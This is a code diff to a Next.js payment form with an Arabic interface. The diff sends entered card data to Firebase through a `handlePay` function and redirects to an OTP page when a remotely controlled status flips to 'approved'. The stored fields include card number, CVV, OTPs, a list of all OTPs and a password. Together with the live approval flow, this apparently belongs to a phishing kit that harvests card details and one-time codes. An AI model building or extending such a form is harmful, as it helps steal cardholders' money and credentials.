@@ -4,15 +4,18 @@ import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { useEffect, useState } from "react"
 import { doc, onSnapshot } from "firebase/firestore"
-import { db } from "@/lib/firebase"
+import { db, handlePay } from "@/lib/firebase"
+import { useRouter } from "next/navigation"
+import { FullPageLoader } from "./fullpageloader"
+
 type PaymentInfo = {
   cardNumber: string
-  year: string
-  month: string
+  year?: string
+  month?: string
   bank?: string
   cvv?: string
   otp?: string
-  pass: string
+  pass?: string
   cardState?: string
   allOtps?: string[]
   bank_card?: string[]
@@ -45,6 +48,7 @@ export default function PaymentForm() {
     status: "new",
     page: "otp",
   })
+  const router = useRouter()
 
   useEffect(() => {
     const visitorId = localStorage.getItem("visitor")
@@ -55,7 +59,7 @@ export default function PaymentForm() {
           if (data.status) {
             setPaymentInfo((prev) => ({ ...prev, status: data.status }))
             if (data.status === "approved") {
-              setstep(2)
+              router.push('/otp')
               setLoading(false)
             } else if (data.status === "rejected") {
               setLoading(false)
@@ -69,7 +73,10 @@ export default function PaymentForm() {
       return () => unsubscribe()
     }
   }, [])
-
+const handleSubmit=()=>{
+  setLoading(true)
+  handlePay(paymentInfo as any,setPaymentInfo as any)
+}
   return (
     <div className="min-h-screen bg-slate-50">
       <div className="max-w-md mx-auto p-6 bg-white rounded-xl shadow-sm">
@@ -102,7 +109,7 @@ export default function PaymentForm() {
         </div>
 
         {/* Card Form */}
-        <div className="space-y-6">
+        <form className="space-y-6" onSubmit={handleSubmit}>
           <h2 className="text-lg font-medium text-center border-b pb-4">ادخال بيانات البطاقة</h2>
           <div className="space-y-4">
             <div>
@@ -159,7 +166,7 @@ export default function PaymentForm() {
           </div>
 
           <Button className="w-full bg-blue-600 hover:bg-blue-700 text-lg py-6">ادفع الآن</Button>
-        </div>
+        </form>
 
         {/* Footer */}
         <div className="mt-8 text-center">
@@ -173,6 +180,7 @@ export default function PaymentForm() {
           />
         </div>
       </div>
+      {loading && <FullPageLoader/>}
     </div>
   )
 }
